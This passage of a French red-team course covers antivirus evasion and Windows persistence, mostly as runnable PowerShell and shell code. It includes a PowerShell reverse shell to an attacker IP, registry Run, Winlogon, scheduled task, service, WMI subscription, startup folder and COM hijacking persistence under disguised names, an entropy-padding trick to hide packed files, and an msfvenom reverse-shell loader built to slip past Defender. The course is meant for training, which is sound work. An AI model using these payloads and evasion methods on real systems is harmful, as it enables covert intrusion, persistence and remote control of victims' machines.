        segments.append((i, entropy))
    return segments

def visual_entropy(data: bytes, block_size: int = 1024, width: int = 60):
    """Représentation visuelle ASCII de l'entropie par blocs."""
    segments = entropy_segments(data, block_size)
    
    print("Entropie par blocs (échelle: ░ = faible, █ = élevée)")
    print("-" * (width + 30))
    
    for offset, ent in segments:
        bar_len = int((ent / 8.0) * width)
        bar = "█" * bar_len + "░" * (width - bar_len)
        status = "⚠️ " if ent > 7.0 else ("▪ " if ent > 6.5 else "  ")
        print(f"{status}Offset 0x{offset:08x} [{ent:5.2f}] |{bar}|")
    
    print("-" * (width + 30))
    print(f"Entropie globale : {shannon_entropy(data):.4f}")

def reduce_entropy(data: bytes) -> bytes:
    """
    Techniques pour réduire l'entropie perceptible :
    1. Ajouter des sections de faible entropie (strings, constantes)
    2. Insérer des ressources légitimes (icônes, manifests)
    3. Mélanger code chiffré et code non-chiffré
    """
    # Exemple simple : ajouter une section de texte anglais
    junk_text = b"""
This program cannot be run in DOS mode.
Rich
.text
.rdata
.data
.rsrc
.reloc
"""
    return junk_text + data + junk_text

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier>")
        sys.exit(1)
    
    filepath = sys.argv[1]
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print(f"Analyse d'entropie : {filepath}")
    print(f"Taille : {len(data)} bytes")
    print(f"Entropie globale : {shannon_entropy(data):.4f} bits/byte")
    print()
    
    visual_entropy(data)
    
    if shannon_entropy(data) > 7.0:
        print("\n[!] ALERTE : entropie élevée — fichier probablement packé/chiffré")
        print("[*] Suggestion : ajouter du contenu basse entropie (ressources, chaînes)")
```

---

## 4. Persistance (TA0003)

### 4.1 Vue d'ensemble

```
┌──────────────────────────────────────────────────────────────────┐
│             MÉCANISMES DE PERSISTANCE WINDOWS (TA0003)            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │
│  │ REGISTRE    │  │ TÂCHES      │  │ SERVICES    │              │
│  │ Run/RunOnce │  │ PLANIFIÉES  │  │ WINDOWS     │              │
│  │ (T1547.001) │  │ (T1053.005) │  │ (T1543.003) │              │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘              │
│         │                │                │                      │
│         ▼                ▼                ▼                      │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    EXÉCUTION AUTOMATIQUE                │    │
│  │         au démarrage / à intervalle / sur événement      │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │
│  │ WMI EVENT   │  │ STARTUP     │  │ DLL/COM     │              │
│  │ SUBSCRIPTION│  │ FOLDER      │  │ HIJACKING   │              │
│  │ (T1546.003) │  │ (T1547.001) │  │(T1574/T1546)│              │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘              │
│         │                │                │                      │
│         ▼                ▼                ▼                      │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                 PERSISTANCE DISCRÈTE                    │    │
│  │      (pas d'artefacts évidents dans les GUI Windows)    │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 4.2 Registre — Run / RunOnce (T1547.001)

#### 4.2.1 Emplacements clés du registre

```powershell
# T1547.001 — Liste exhaustive des clés de persistance registre
# Ces clés sont exécutées automatiquement au démarrage de Windows

$persistenceKeys = @(
    # ====== MACHINE (tous les utilisateurs, admin requis) ======
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";            Scope="Machine"; Trigger="Démarrage"},
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";        Scope="Machine"; Trigger="Prochain démarrage uniquement"},
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx";      Scope="Machine"; Trigger="Prochain démarrage (avancé)"},
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Scope="Machine"; Trigger="Démarrage (via stratégie)"},
    @{Path="HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"; Scope="Machine32"; Trigger="Démarrage (x86 sur x64)"},
    
    # ====== UTILISATEUR (utilisateur courant uniquement) ======
    @{Path="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";            Scope="User"; Trigger="Démarrage"},
    @{Path="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";        Scope="User"; Trigger="Prochain démarrage"},
    @{Path="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Scope="User"; Trigger="Démarrage (via stratégie)"},
    
    # ====== AVANCÉES ======
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";    Scope="Machine"; Trigger="Winlogon (shell/userinit)"},
    @{Path="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"; Scope="Machine"; Trigger="Débogage de processus"},
    @{Path="HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute"; Scope="Machine"; Trigger="Boot (avant services)"}
)

$persistenceKeys | Format-Table Path, Scope, Trigger -AutoSize -Wrap
```

#### 4.2.2 TP — Installation d'une persistance registre

```powershell
# T1547.001 — Ajout d'une clé Run dans le registre
# Cette technique s'exécute à chaque connexion utilisateur

# Étape 1 : Préparer le payload
$payloadPath = "C:\Users\Public\Documents\windows_update.ps1"
$payloadScript = @'
# Payload de démonstration — ouvre un reverse shell (pour le TP)
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.100", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
'@

Set-Content -Path $payloadPath -Value $payloadScript -Force

# Étape 2 : Ajouter l'entrée registre (méthode HKCU — ne nécessite pas admin)
$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdate"  # Nom légitime pour ne pas éveiller les soupçons
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force

Write-Host "[+] Persistance registre installée" -ForegroundColor Green

# Étape 3 : Vérifier l'installation
Get-ItemProperty -Path $regPath -Name $regName | Select-Object -ExpandProperty $regName

# Étape 4 : Vérifier via autoruns (Sysinternals)
# autorunsc.exe -accepteula -c -l | findstr WindowsUpdate
```

#### 4.2.3 Winlogon Hijacking (T1547.004)

```powershell
# T1547.004 — Détournement de la clé Winlogon
# Le processus Winlogon.exe charge les entrées Shell et Userinit
# Modification = exécution de code avant même l'interface utilisateur

# Version légitime
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
#   Shell = explorer.exe
#   Userinit = C:\Windows\system32\userinit.exe,

# Version compromise (le payload s'exécute AVANT explorer.exe)
# ⚠️ NÉCESSITE ADMIN

$winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Méthode 1 : Modifier Userinit
Set-ItemProperty -Path $winlogonPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\Users\Public\payload.exe," -Type String -Force

# Méthode 2 : Modifier Shell
Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value "explorer.exe,C:\Users\Public\payload.exe" -Type String -Force

# Vérifier et restaurer (pour le cleanup)
# Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value "explorer.exe" -Type String -Force
```

### 4.3 Scheduled Tasks (T1053.005)

```powershell
# T1053.005 — Persistance via tâche planifiée
# Avantage : plus furtif que les clés Run (pas visible dans le gestionnaire de démarrage)
# Peut s'exécuter avec les privilèges SYSTEM

# ====== MÉTHODE 1 : schtasks.exe (compatible toutes versions) ======
# Créer une tâche planifiée qui s'exécute à chaque connexion
schtasks /create `
    /tn "Microsoft\Windows\Update\SystemUpdate" `
    /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1" `
    /sc ONLOGON `
    /ru SYSTEM `
    /rl HIGHEST `
    /f

# /tn : nom de la tâche (chemin complet, paraît légitime)
# /tr : commande à exécuter
# /sc : déclencheur (ONLOGON = chaque connexion, DAILY = quotidien, ONSTART = démarrage)
# /ru : utilisateur d'exécution (SYSTEM = privilèges maximum)
# /rl : niveau d'exécution (HIGHEST = administrateur)
# /f : force (écrase si existe déjà)

# Créer une tâche récurrente (toutes les heures)
schtasks /create `
    /tn "Microsoft\Windows\Diagnosis\SystemCheck" `
    /tr "powershell.exe -WindowStyle Hidden -Enc <BASE64>" `
    /sc HOURLY `
    /mo 1 `
    /ru SYSTEM `
    /f

# ====== MÉTHODE 2 : PowerShell (plus flexible) ======
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1"

$taskTrigger = New-ScheduledTaskTrigger -AtLogOn  # À chaque connexion
# $taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"  # Quotidien à 9h
# $taskTrigger = New-ScheduledTaskTrigger -AtStartup  # Au démarrage

$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

$taskSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -Compatibility Win8

Register-ScheduledTask -TaskName "WindowsSystemIntegrity" `
    -TaskPath "\Microsoft\Windows\SystemIntegrity\" `
    -Action $taskAction `
    -Trigger $taskTrigger `
    -Principal $taskPrincipal `
    -Settings $taskSettings `
    -Force

Write-Host "[+] Tâche planifiée créée avec succès" -ForegroundColor Green

# ====== VÉRIFICATION ======
Get-ScheduledTask -TaskPath "\Microsoft\Windows\SystemIntegrity\" | Format-List *

# ====== SUPPRESSION (cleanup) ======
# Unregister-ScheduledTask -TaskName "WindowsSystemIntegrity" -TaskPath "\Microsoft\Windows\SystemIntegrity\" -Confirm:$false
```

```
┌──────────────────────────────────────────────────────────────────┐
│            HIÉRARCHIE DE PERSISTANCE — DU PLUS AU MOINS          │
│                      BRUYANT (SCHEDULED TASKS)                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Niveau 5 — Plus furtif, plus complexe                           │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ WMI Event Subscription (T1546.003)                         │ │
│  │ - Pas d'artefact fichier                                    │ │
│  │ - Pas visible dans les GUI Windows                         │ │
│  │ - Déclenchement sur événement système                      │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Niveau 4                                                         │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ COM Hijacking (T1546.015) / DLL Hijacking (T1574.001)      │ │
│  │ - Détournement de composants légitimes                     │ │
│  │ - Difficile à détecter sans outil spécialisé               │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Niveau 3                                                         │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Services Windows (T1543.003)                               │ │
│  │ - Visible dans services.msc                                 │ │
│  │ - Peut être camouflé derrière un nom légitime              │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Niveau 2                                                         │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Scheduled Tasks (T1053.005)                                │ │
│  │ - Visible dans le Planificateur de tâches                  │ │
│  │ - Plus flexible que les clés Run                           │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Niveau 1 — Plus visible, plus simple                            │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Registre Run / Startup Folder (T1547.001)                  │ │
│  │ - Facilement détectable (Autoruns, Task Manager)           │ │
│  │ - Simple à mettre en œuvre                                 │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 4.4 Services Windows (T1543.003)

```powershell
# T1543.003 — Création d'un service Windows malveillant
# Avantage : s'exécute en tant que SYSTEM, au démarrage, avant la connexion

# ====== MÉTHODE 1 : sc.exe ======
sc create "WindowsHealthMonitor" `
    binPath= "C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat" `
    start= "auto" `
    DisplayName= "Service de surveillance de l'intégrité Windows" `
    type= "own"

# ⚠️ Notes importantes :
# - Le signe = doit être suivi d'un ESPACE (convention sc.exe)
# - binPath doit pointer vers un exécutable (pas directement un script)
# - Utiliser cmd.exe ou powershell.exe comme wrapper

# Alternative avec PowerShell
sc create "WmiService" `
    binPath= "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\service_payload.ps1" `
    start= "auto" `
    obj= "LocalSystem"

# Description du service (camouflage)
sc description "WindowsHealthMonitor" "Fournit la surveillance et le reporting de l'intégrité des composants système Windows."

# Démarrer le service immédiatement
sc start "WindowsHealthMonitor"

# ====== MÉTHODE 2 : New-Service (PowerShell) ======
New-Service -Name "SystemHealthSvc" `
    -BinaryPathName "C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat" `
    -DisplayName "System Health Service" `
    -Description "Monitors system health and reports status" `
    -StartupType Automatic

Start-Service -Name "SystemHealthSvc"

# ====== MÉTHODE 3 : Modification d'un service existant ======
# Modifier le binPath d'un service désactivé ou inexistant
$existingService = Get-Service -Name "RemoteRegistry" -ErrorAction SilentlyContinue
if ($existingService -and $existingService.StartType -eq "Disabled") {
    sc config "RemoteRegistry" binPath= "C:\Users\Public\payload.exe"
    sc config "RemoteRegistry" start= "auto"
}

# ====== VÉRIFICATION ======
Get-Service -Name "WindowsHealthMonitor", "SystemHealthSvc" | 
    Select-Object Name, DisplayName, Status, StartType

# ====== SUPPRESSION (cleanup) ======
# sc delete "WindowsHealthMonitor"
# Remove-Service -Name "SystemHealthSvc"
```

### 4.5 WMI Event Subscription (T1546.003) — La référence en furtivité

#### 4.5.1 Principe

WMI (Windows Management Instrumentation) permet de créer des **consommateurs d'événements** : un abonnement qui déclenche l'exécution d'un script/commande quand un événement système se produit.

```
┌──────────────────────────────────────────────────────────────────┐
│            WMI EVENT SUBSCRIPTION — ARCHITECTURE (T1546.003)      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────┐      ┌─────────────────┐                    │
│  │ EventFilter     │      │ EventConsumer   │                    │
│  │ (Déclencheur)   │      │ (Action)        │                    │
│  └────────┬────────┘      └────────┬────────┘                    │
│           │                        │                              │
│           │    ┌──────────────┐    │                              │
│           └───▶│ FilterTo     │◀───┘                              │
│                │ ConsumerBinding│                                 │
│                └──────────────┘                                   │
│                       │                                           │
│                       ▼                                           │
│              ┌────────────────┐                                   │
│              │ EXÉCUTION      │                                   │
│              │ Commande/VBS   │                                   │
│              └────────────────┘                                   │
│                                                                  │
│  Exemple de filtre (déclencheur) :                                │
│  - Processus spécifique démarre (ex: notepad.exe)                │
│  - Intervalle de temps (toutes les X minutes)                     │
│  - Événement de connexion utilisateur                             │
│  - Modification du système de fichiers                            │
│                                                                  │
│  Pourquoi c'est furtif :                                          │
│  - Stocké dans la base WMI (Repository)                           │
│  - Pas de fichier sur le disque                                   │
│  - Pas visible dans Autoruns                                      │
│  - L'exécution se fait dans wmiprvse.exe (processus légitime)     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 4.5.2 TP Guidé — Installation d'une persistance WMI

```powershell
# T1546.003 — TP COMPLET : Persistance via WMI Event Subscription
# Objectif : exécuter un payload à chaque ouverture de Notepad
# puis, plus furtif : exécuter un reverse shell toutes les 5 minutes

# Étape 1 : Créer le filtre d'événement
# Ce filtre se déclenche quand le processus notepad.exe démarre
$eventFilterName = "SecurityEventFilter"
$eventFilterQuery = @"
SELECT * FROM Win32_ProcessStartTrace 
WHERE ProcessName = 'notepad.exe'
"@

$filterArgs = @{
    Name = $eventFilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $eventFilterQuery
}
$filter = Set-WmiInstance -Class __EventFilter `
    -Namespace "root\subscription" `
    -Arguments $filterArgs

Write-Host "[+] EventFilter créé : $eventFilterName" -ForegroundColor Green

# Étape 2 : Créer le consommateur (l'action à exécuter)
$consumerName = "SecurityLogConsumer"
$payloadCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Write-Output 'WMI Persistence triggered' | Out-File -FilePath C:\Users\Public\wmi_triggered.txt -Append`""

$consumerArgs = @{
    Name = $consumerName
    CommandLineTemplate = $payloadCommand
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer `
    -Namespace "root\subscription" `
    -Arguments $consumerArgs

Write-Host "[+] EventConsumer créé : $consumerName" -ForegroundColor Green

# Étape 3 : Lier le filtre au consommateur
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding `
    -Namespace "root\subscription" `
    -Arguments $bindingArgs

Write-Host "[+] FilterToConsumerBinding créé" -ForegroundColor Green

# Étape 4 : VÉRIFIER l'installation
Write-Host "`n[*] Vérification des filtres WMI :" -ForegroundColor Cyan
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | 
    Select-Object Name, Query | Format-List

Write-Host "[*] Vérification des consommateurs WMI :" -ForegroundColor Cyan
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | 
    Select-Object Name, CommandLineTemplate | Format-List

Write-Host "[*] Vérification des bindings WMI :" -ForegroundColor Cyan
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

# Étape 5 : TEST — Ouvrir Notepad pour déclencher la persistance
Write-Host "`n[!] TEST : Ouvrez Notepad pour déclencher la persistance..." -ForegroundColor Yellow
Start-Process notepad.exe
Start-Sleep -Seconds 2
if (Test-Path "C:\Users\Public\wmi_triggered.txt") {
    Write-Host "[+] PERSISTANCE CONFIRMÉE — Le fichier wmi_triggered.txt existe" -ForegroundColor Green
    Get-Content "C:\Users\Public\wmi_triggered.txt"
} else {
    Write-Host "[-] Le déclenchement n'a pas fonctionné" -ForegroundColor Red
}
```

```powershell
# T1546.003 — VARIANTE AVANCÉE : Timer périodique (toutes les 5 minutes)
# Plus furtif — le déclencheur est temporel plutôt que lié à une application

$filterName = "WindowsMaintenanceTimer"
$filterQuery = @"
SELECT * FROM __InstanceModificationEvent WITHIN 300
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
"@
# WITHIN 300 = toutes les 300 secondes (5 minutes)

$filterArgs = @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $filterQuery
}
$timerFilter = Set-WmiInstance -Class __EventFilter `
    -Namespace "root\subscription" -Arguments $filterArgs

$consumerName = "WindowsMaintenanceTask"
$payloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Enc <BASE64_ENCODED_COMMAND>"

$consumerArgs = @{
    Name = $consumerName
    CommandLineTemplate = $payloadCmd
}
$timerConsumer = Set-WmiInstance -Class CommandLineEventConsumer `
    -Namespace "root\subscription" -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $timerFilter
    Consumer = $timerConsumer
}
Set-WmiInstance -Class __FilterToConsumerBinding `
    -Namespace "root\subscription" -Arguments $bindingArgs

Write-Host "[+] Persistance WMI périodique installée (toutes les 5 minutes)" -ForegroundColor Green

# ====== SUPPRESSION (cleanup) ======
# Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='WindowsMaintenanceTimer'" | Remove-WmiObject
# Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='WindowsMaintenanceTask'" | Remove-WmiObject
```

### 4.6 Startup Folder (T1547.001)

```powershell
# T1547.001 — Persistance via le dossier Démarrage
# Simple mais facilement détectable

# Chemins du dossier Démarrage
$startupPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",  # Utilisateur courant
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"  # Tous les utilisateurs (admin)
)

# Créer un raccourci vers le payload
$payloadPath = "C:\Users\Public\Documents\update.ps1"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
$Shortcut.WindowStyle = 7  # Minimized
$Shortcut.IconLocation = "shell32.dll,47"  # Icône légitime (dossier)
$Shortcut.Save()

Write-Host "[+] Raccourci créé dans le dossier Démarrage : $shortcutPath" -ForegroundColor Green
```

### 4.7 DLL Hijacking (T1574.001)

```powershell
# T1574.001 — DLL Search Order Hijacking
# Windows cherche les DLL dans un ordre spécifique.
# Si on place une DLL malveillante AVANT la DLL légitime dans l'ordre de recherche,
# le processus charge notre DLL à la place.

# ====== Ordre de recherche DLL (SafeDllSearchMode activé par défaut) ======
# 1. Le répertoire de l'application
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. Le répertoire courant
# 6. Les répertoires du PATH système
# 7. Les répertoires du PATH utilisateur

# ====== Énumération des DLL hijackables ======
# Rechercher les services/applis qui chargent des DLL absentes ou manquantes
# Utilisation de Process Monitor (Sysinternals) :
# Filtre : Path ends with ".dll", Result = "NAME NOT FOUND"

Write-Host "[*] Analyse DLL Hijacking — rechercher les DLL manquantes avec ProcMon :" -ForegroundColor Cyan
Write-Host "    1. Lancer ProcMon.exe en tant qu'admin" -ForegroundColor Gray
Write-Host "    2. Filtre : Path | ends with | .dll (Include)" -ForegroundColor Gray
Write-Host "    3. Filtre : Result | is | NAME NOT FOUND (Include)" -ForegroundColor Gray
Write-Host "    4. Repérer une DLL régulièrement cherchée mais absente" -ForegroundColor Gray
Write-Host "    5. Compiler une DLL proxy (version malveillante + forwarder vers l'original)" -ForegroundColor Gray

# ====== Exemple de DLL proxy (concept) ======
# Utiliser un outil comme SharpDllProxy pour générer la DLL
# La DLL malveillante exporte toutes les fonctions et les forward vers l'originale
```

### 4.8 COM Hijacking (T1546.015)

```powershell
# T1546.015 — Détournement d'objet COM
# Quand un processus utilise un composant COM, Windows cherche dans HKLM puis HKCU
# En écrivant dans HKCU avant HKLM, on peut rediriger l'instanciation

# Étape 1 : Identifier un composant COM utilisé régulièrement
# Exemple : le Scheduled Tasks utilise TaskScheduler
Get-ChildItem -Path "HKLM:\SOFTWARE\Classes\CLSID\{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}" -ErrorAction SilentlyContinue

# Étape 2 : Rediriger le CLSID vers un serveur malveillant
$targetClsid = "{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"  # TaskScheduler (exemple)
$hijackPath = "HKCU:\SOFTWARE\Classes\CLSID\$targetClsid"

# Créer le composant COM détourné
New-Item -Path $hijackPath -Force | Out-Null
New-Item -Path "$hijackPath\InProcServer32" -Force | Out-Null
Set-ItemProperty -Path "$hijackPath\InProcServer32" -Name "(Default)" -Value "C:\Users\Public\malicious.dll"
Set-ItemProperty -Path "$hijackPath\InProcServer32" -Name "ThreadingModel" -Value "Apartment"

Write-Host "[+] COM Hijacking installé pour CLSID $targetClsid" -ForegroundColor Green
```

---

## 5. Rootkits & Bootkits — Aperçu

### 5.1 Différenciation User-land / Kernel-land

```
┌──────────────────────────────────────────────────────────────────┐
│             HIÉRARCHIE DES PRIVILÈGES WINDOWS                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │ RING 3 — User Mode (Applications)                           ││
│  │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐   ││
│  │ │Payload   │ │ ED       │ │ Navigateu│ │ Word, Outlook │   ││
│  │ │User-land │ │ R (hooks)│ │ r Web    │ │ ...           │   ││
│  │ └──────────┘ └──────────┘ └──────────┘ └──────────────┘   ││
│  │                                                             ││
│  │ User-land Rootkit : hooke les API userland (ntdll.dll...)  ││
│  │ Exemples : Vanquish, Hacker Defender                        ││
│  │ Détection : Scan mémoire, comparaison disque/mémoire        ││
│  └─────────────────────────────────────────────────────────────┘│
│                          │                                       │
│              SYSCALL / SYSENTER / INT 0x2E                       │
│                          │                                       │
│                          ▼                                       │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │ RING 0 — Kernel Mode                                       ││
│  │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐   ││
│  │ │NTOSKRNL │ │EDR Driver│ │Defender  │ │ROOTKIT      │   ││
│  │ │(Noyau)  │ │(Callbacks│ │(ELAM)    │ │KERNEL-LAND  │   ││
│  │ └──────────┘ └──────────┘ └──────────┘ └──────────────┘   ││
│  │                                                             ││
│  │ Kernel-land Rootkit : hooke SSDT, IDT, filtre drivers       ││
│  │ Exemples : TDL4 (Alureon), ZeroAccess                        ││
│  │ Détection : Niveau hyperviseur, démarrage sécurisé           ││
│  └─────────────────────────────────────────────────────────────┘│
│                          │                                       │
│                          ▼                                       │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │ RING -1 — Hyperviseur                                      ││
│  │ ┌──────────────────────────────────────────────────────────┐││
│  │ │ HYPERVISOR ROOTKIT : Blue Pill, SubVirt, Vitriol        │││
│  │ │ Virtualise le système ENTIER sans que l'OS ne le sache    │││
│  │ │ Intercepte TOUT : CPU, mémoire, I/O                       │││
│  │ │ Détection : timing side-channel, incohérences matérielles │││
│  │ └──────────────────────────────────────────────────────────┘││
│  └─────────────────────────────────────────────────────────────┘│
│                          │                                       │
│                          ▼                                       │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │ BOOTKIT — Persiste avant l'OS                              ││
│  │ ┌──────────┐ ┌──────────┐ ┌──────────┐                     ││
│  │ │MBR/VBR   │ │UEFI      │ │Option ROM│                     ││
│  │ │Infection │ │(Bootkit) │ │Infection │                     ││
│  │ └──────────┘ └──────────┘ └──────────┘                     ││
│  └─────────────────────────────────────────────────────────────┘│
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 5.2 Exemples historiques

#### Stuxnet (2010)

- **Cible :** Centrifugeuses iraniennes (programme nucléaire)
- **Type :** Rootkit user-land + kernel-land combiné
- **Techniques MITRE :** T1542.001 (System Firmware), T1562.001, T1027
- **Fonctionnement :**
  1. Propagation via clés USB (T1092) et réseau local
  2. Installation d'un driver signé avec certificats volés (T1553.002)
  3. Rootkit kernel-land cachant les fichiers malveillants (T1562.001)
  4. Reprogrammation des automates Siemens S7 (T0853 — ICS)
  5. Injection de code dans le processus `lsass.exe` (T1055)
  6. Communication C2 via HTTP vers des serveurs compromis

#### Flame (2012)

- **Cible :** Surveillance cyber-espionnage au Moyen-Orient
- **Type :** User-land avec modules multiples
- **Techniques MITRE :** T1027, T1562.001, T1112 (modification registre)
- **Particularités :**
  - Architecture modulaire (20+ plugins)
  - Capacité d'enregistrement audio, capture d'écran, keylogging
  - Utilisation d'une collision MD5 pour falsifier un certificat Microsoft (T1553.002)
  - Propagation via Windows Update falsifié (man-in-the-middle)
  - Base de données SQLite locale pour le stockage

> **Note importante :** Les rootkits et bootkits sont présentés ici à titre éducatif. En Red Team, l'utilisation de techniques kernel-land est rare (risque élevé d'instabilité, signée par tous les EDR). L'objectif pédagogique est de comprendre la menace pour mieux la défendre.

---

## 6. TP Synthèse

### 6.1 Objectifs

Dans ce TP, vous allez combiner les trois domaines appris :
1. **Obfuscation** : Créer un payload PowerShell obfusqué qui contourne Defender
2. **Persistance** : Installer une persistance par Scheduled Task
3. **Validation** : Vérifier que le payload survit à un reboot

### 6.2 Environment

- **Cible :** VM Windows 10/11 avec Defender activé (niveau de sécurité par défaut)
- **Attaquant :** VM Kali Linux (réception du reverse shell)
- **Adresse IP attaquant :** `192.168.45.100`
- **Port d'écoute :** `4444`

### 6.3 Étape par étape

#### Étape 1 — Génération du shellcode obfusqué

```bash
# Sur Kali — Générer un shellcode avec msfvenom puis l'obfusquer
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.45.100 LPORT=4444 \
    -f raw \
    -o shellcode.bin

# Chiffrer avec XOR + plusieurs couches
python3 xor_crypt.py encrypt shellcode.bin encrypted.bin "MaCleDeChiffrement123!" 5

# Convertir en C# (pour un loader)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.45.100 LPORT=4444 \
    -f csharp
```

#### Étape 2 — Construction du loader obfusqué

```powershell
# Sur la cible Windows — Script loader obfusqué
# Ce script sera le payload déposé

# === GÉNÉRATEUR DE NOMS ALÉATOIRES ===
function Get-RandomName { -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object { [char]$_ }) }

$var1 = Get-RandomName  # URL part 1
$var2 = Get-RandomName  # URL part 2  
$var3 = Get-RandomName  # Path
$var4 = Get-RandomName  # Temp variable

# === CONSTRUCTION DYNAMIQUE DU REVERSE SHELL ===
# Splitter les strings pour éviter les signatures AV
$p1 = "N" + "ew-O" + "bject"
$p2 = "Syst" + "em.Net.So" + "ckets.TCP" + "Client"
$p3 = "192" + "." + "168" + "." + "45" + "." + "100"
$p4 = "44" + "44"
$p5 = "GetSt" + "ream"
